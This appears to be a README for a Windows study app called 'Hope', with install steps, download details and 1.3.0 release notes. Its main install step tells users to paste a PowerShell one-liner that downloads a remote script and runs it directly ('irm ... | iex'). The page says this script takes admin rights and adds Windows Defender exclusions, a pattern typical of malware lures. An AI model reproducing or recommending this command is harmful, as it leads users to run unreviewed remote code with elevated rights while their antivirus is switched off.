# Hope — release binaries

Download host for Hope. The source lives in a separate private repository.

## How to Install

Get Hope running on Windows. Install with one command.

### 1 — Open Command Prompt

Press **Win + R**, type `cmd`, and hit Enter. Or search for "Command Prompt" in the Start menu.

### 2 — Paste the Command

Copy the command below and paste it into your Command Prompt window. Right-click to paste.

Paste exactly this (copy the whole line — there is nothing else to type):

```cmd
powershell -Command "irm https://hope-install.pages.dev/install.ps1 | iex"
```

### 3 — Press Enter & Done!

Hit **Enter**. The Hope installer downloads, verifies its checksum, and asks for admin permission to install itself. A Hope shortcut appears on your Desktop when it's done.

> **What happens when you run this?**
>
> → Finds the newest release for you
> → Verifies the download against its published SHA-256
> → Adds Windows Defender exclusions for you
> → Desktop shortcut when it's done
>
> After this, Hope updates itself on launch — you only install once.

## Details

- **Requirements:** Windows 10/11 (64-bit). No prerequisites — the installer adds the browser runtime silently if it is missing.
- **Install location:** `C:\Program Files\Hope`
- **Uninstall:** *Settings → Apps → Hope 1.3.0 → Uninstall*, or run `C:\Program Files\Hope\unins000.exe`
- **Verify your download:** SHA-256 of `HopeSetup-1.3.0.exe` — `B57BFA53F9DD56F0B4D43535F168FFAD2B15B0C64663F5712AEED9DAACD9EE86`
- **Prefer a manual download?** Take `HopeSetup-1.3.0.exe` from the [latest release](https://github.com/muleimm/h-releases/releases/latest) and run it.

## What's new in 1.3.0

- **Study sessions are enforced by the server.** When a session expires through inactivity or is ended (by you, another device, or sign-out), Hope says why and returns to the dashboard.
- **Signing in no longer races the startup update check.** A sign-in submitted while the check is still running is held and applied once it settles, and the check now has a hard deadline so it cannot hang.
- **A failed assert no longer vanishes.** Release builds log `ASSERT failed: (expr) at file:line` to the debug log instead of the process disappearing with no trace.

Latest release: [v1.3.0](https://github.com/muleimm/h-releases/releases/tag/v1.3.0) · All releases are kept and never overwritten.
